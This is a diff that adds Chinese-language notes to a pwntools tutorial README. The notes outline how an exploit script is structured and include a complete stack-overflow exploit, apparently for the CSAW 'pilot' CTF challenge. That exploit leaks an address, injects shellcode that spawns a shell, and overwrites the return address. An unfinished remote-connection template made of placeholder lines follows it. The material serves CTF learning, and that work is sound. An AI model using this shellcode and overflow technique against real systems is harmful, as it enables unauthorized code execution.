@@ -3,6 +3,64 @@
 Pwntools Tutorials
 https://github.com/Gallopsled/pwntools-tutorial#readme
 ```
+# 程式架構
+```
+# 載入pwntools套件
+   from pwn import *
+# 建立目標物件
+# 產生payload
+# 送出payload給目標物件
+# 保持與目標物件的互動Shell
+```
+## 本地端執行
+```
+from pwn import *
+
+# 建立目標物件
+target = process('./pilot')
+
+
+# 產生payload
+print target.recvuntil("[*]Location:")
+
+leak = target.recvline()
+
+inputAdr = int(leak.strip("\n"), 16)
+
+
+payload = ""
+# This shellcode is originally from: https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/
+# However it looks like that site is down now
+# This shellcode will pop a shell when we run it
+payload += "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05" 
+
+# Padding to the return address
+payload += "0"*(0x28 - len(payload))
+
+# Overwrite the return address with the address of the start of our input
+payload += p64(inputAdr)
+
+# 送出payload給目標物件
+# Send the payload, drop to an interactive shell to use the shell we pop
+target.send(payload)
+
+# 保持與目標物件的互動Shell
+target.interactive()
+```
+##  連練到遠端CTF執行PWN
+```
+#!/usr/bin/env python3
+from pwn import *
+
+# 
+# r = remote(‘題目的IP',題目的PORT)  <==
+
++++++++++++++++
++++++++++++++++
+
+
+r.interactive()
+```
 # 基本IO功能
 ```
 接收資料
